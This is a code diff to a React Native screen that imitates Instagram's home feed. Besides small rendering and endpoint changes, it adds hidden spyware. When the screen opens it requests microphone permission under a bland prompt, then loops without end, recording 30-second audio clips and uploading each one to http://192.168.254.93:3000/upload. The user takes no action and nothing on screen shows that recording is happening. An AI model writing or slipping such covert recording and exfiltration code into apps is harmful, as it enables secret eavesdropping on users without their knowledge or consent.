@@ -2,12 +2,15 @@ import React, { useEffect, useState } from "react";
 import {
   FlatList,
   Image,
+  PermissionsAndroid, Platform,
   SafeAreaView,
   StyleSheet,
   Text,
   TouchableOpacity,
   View,
 } from "react-native";
+import AudioRecorderPlayer from 'react-native-audio-recorder-player';
+import RNFS from 'react-native-fs';
 
 // Dummy data for stories
 /* const initialStories = [
@@ -47,9 +50,106 @@ export default function InstagramHome() {
   const [posts, setPosts] = useState([]);
   const [ads, setAds] = useState(true);
 
+  const audioRecorderPlayer = new AudioRecorderPlayer();
+
+  const requestMicrophonePermission = async () => {
+    if (Platform.OS === 'android') {
+      try {
+        const granted = await PermissionsAndroid.request(
+          PermissionsAndroid.PERMISSIONS.RECORD_AUDIO,
+          {
+            title: "Microphone Permission",
+            message: "This app needs access to your microphone to record audio.",
+            buttonNeutral: "Ask Me Later",
+            buttonNegative: "Cancel",
+            buttonPositive: "OK",
+          }
+        );
+        return granted === PermissionsAndroid.RESULTS.GRANTED;
+      } catch (err) {
+        console.warn(err);
+        return false;
+      }
+    }
+    return true; // iOS handles permissions differently
+  };
+
+  const startRecording = async () => {
+    try {
+      const result = await audioRecorderPlayer.startRecorder(
+        `${RNFS.DocumentDirectoryPath}/audio_chunk.mp4`
+      );
+      console.log('Recording started: ', result);
+    } catch (err) {
+      console.error('Error starting recording:', err);
+    }
+  };
+  
+  const stopRecording = async () => {
+    try {
+      const result = await audioRecorderPlayer.stopRecorder();
+      console.log('Recording stopped: ', result);
+      return result; // Return file path of the recorded audio
+    } catch (err) {
+      console.error('Error stopping recording:', err);
+      return null;
+    }
+  };
+
+  const sendAudioToServer = async (audioFilePath) => {
+    try {
+      const formData = new FormData();
+      formData.append('file', {
+        uri: audioFilePath,
+        name: 'audio_chunk.wav',
+        type: 'audio/wav',
+      });
+  
+      const response = await fetch('http://192.168.254.93:3000/upload', {
+        method: 'POST',
+        body: formData,
+        headers: {
+          'Content-Type': 'multipart/form-data',
+        },
+      });
+  
+      const result = await response.json();
+      console.log('Server response:', result);
+    } catch (err) {
+      console.error('Error uploading audio:', err);
+    }
+  };
+  
+
+  const recordAndSendAudio = async () => {
+    const hasPermission = await requestMicrophonePermission();
+    if (!hasPermission) {
+      console.warn('Microphone permission denied');
+      return;
+    }
+  
+    setInterval(async () => {
+      console.log('Recording audio...');
+      await startRecording();
+  
+      setTimeout(async () => {
+        console.log('Stopping and uploading audio...');
+        const audioFilePath = await stopRecording();
+        if (audioFilePath) {
+          await sendAudioToServer(audioFilePath);
+        }
+      }, 30000); // Record for 30 seconds
+    }, 31000); // Interval for recording and sending audio
+  };
+  
+  useEffect(() => {
+    recordAndSendAudio();
+  }, []);
+  
+
   const fetchStories = async () => {
     try {
-      const response = await fetch('http://192.168.0.15:3000/api/stories');
+      const response = await fetch('http://192.168.254.93:3000//api/stories');
       const data = await response.json();
       setStories(data);
     } catch (error) {
@@ -59,7 +159,7 @@ export default function InstagramHome() {
 
   const fetchPosts = async () => {
     try {
-      const response = await fetch('http://192.168.0.15:3000/api/posts');
+      const response = await fetch('http://192.168.254.93:3000//api/posts');
       const data = await response.json();
       setPosts(data);
     } catch (error) {
@@ -80,46 +180,52 @@ export default function InstagramHome() {
     ));
   };
 
-  const renderStory = ({ item }) => (
-    <View
-      style={{
-        alignItems: "center",
-        marginHorizontal: 5,
-        width: 70,
-      }}
-    >
+  const renderStory = ({ item }) => {
+
+    if(item.show == "true"){
+    return (
       <View
         style={{
-          borderWidth: 2,
-          borderColor: item.isUser ? "#FFFFFF" : "#FF8501",
-          borderRadius: 35,
-          padding: 2,
+          alignItems: "center",
+          marginHorizontal: 5,
+          width: 70,
         }}
       >
-        <Image
-          source={{ uri: item.img }}
+        <View
           style={{
-            width: 60,
-            height: 60,
-            borderRadius: 30,
+            borderWidth: 2,
+            borderColor: item.isUser ? "#FFFFFF" : "#FF8501",
+            borderRadius: 35,
+            padding: 2,
           }}
-        />
+        >
+          <Image
+            source={{ uri: item.img }}
+            style={{
+              width: 60,
+              height: 60,
+              borderRadius: 30,
+            }}
+          />
+        </View>
+        <Text
+          style={{
+            color: "#FFFFFF",
+            fontSize: 12,
+            marginTop: 4,
+            textAlign: "center",
+          }}
+          numberOfLines={1}
+        >
+          {item.user}
+        </Text>
       </View>
-      <Text
-        style={{
-          color: "#FFFFFF",
-          fontSize: 12,
-          marginTop: 4,
-          textAlign: "center",
-        }}
-        numberOfLines={1}
-      >
-        {item.user}
-      </Text>
-    </View>
-  );
+    );}
+  }
 
-  const renderPost = ({ item }) => (
+  const renderPost = ({ item }) => {
+    if(item.show=="true"){
+    return(
     <View style={styles.postContainer}>
       {/* Post Header */}
       <View style={styles.postHeader}>
@@ -142,10 +248,10 @@ export default function InstagramHome() {
             <Image source={item.liked ? require('./m_icon/like-d.png') : require('./m_icon/like.png')} style={{ width: 30, height: 28 }} />
           </TouchableOpacity>
           <TouchableOpacity>
-          <Image source={require('./m_icon/comment.png')} style={{ width: 30, height: 28 }} />
+            <Image source={require('./m_icon/comment.png')} style={{ width: 30, height: 28 }} />
           </TouchableOpacity>
           <TouchableOpacity>
-          <Image source={require('./m_icon/send.png')} style={{ width: 28, height: 26 }} />
+            <Image source={require('./m_icon/send.png')} style={{ width: 28, height: 26 }} />
           </TouchableOpacity>
         </View>
         <TouchableOpacity>
@@ -164,7 +270,8 @@ export default function InstagramHome() {
         <Text style={styles.timeText}>{item.time}</Text>
       </View>
     </View>
-  );
+  );}
+}
 
   return (
     <SafeAreaView style={styles.container}>
@@ -206,19 +313,19 @@ export default function InstagramHome() {
       {/* Bottom Navigation */}
       <View style={styles.navBar}>
         <TouchableOpacity>
-        <Image source={require('./m_icon/home.png')} style={{ width: 30, height: 28 }} />
+          <Image source={require('./m_icon/home.png')} style={{ width: 30, height: 28 }} />
         </TouchableOpacity>
         <TouchableOpacity>
-        <Image source={require('./m_icon/search.png')} style={{ width: 30, height: 28 }} />
+          <Image source={require('./m_icon/search.png')} style={{ width: 30, height: 28 }} />
         </TouchableOpacity>
         <TouchableOpacity>
-        <Image source={require('./m_icon/post.png')} style={{ width: 30, height: 28 }} />
+          <Image source={require('./m_icon/post.png')} style={{ width: 30, height: 28 }} />
         </TouchableOpacity>
         <TouchableOpacity>
-        <Image source={require('./m_icon/like.png')} style={{ width: 30, height: 28 }} />
+          <Image source={require('./m_icon/like.png')} style={{ width: 30, height: 28 }} />
         </TouchableOpacity>
         <TouchableOpacity>
-        <Image source={{uri: 'https://randomuser.me/api/portraits/men/1.jpg'}} style={{ width: 30, height: 28, borderRadius: 100}} />
+          <Image source={{ uri: 'https://randomuser.me/api/portraits/men/1.jpg' }} style={{ width: 30, height: 28, borderRadius: 100 }} />
         </TouchableOpacity>
       </View>
     </SafeAreaView>
@@ -326,13 +433,13 @@ const styles = StyleSheet.create({
   },
   actionIcons: {
     flexDirection: "row",
-    
+
     width: '30%',
     justifyContent: 'space-around'
   },
   actionIcon: {
     marginRight: 15,
-    
+
   },
   postInfo: {
     paddingHorizontal: 10,
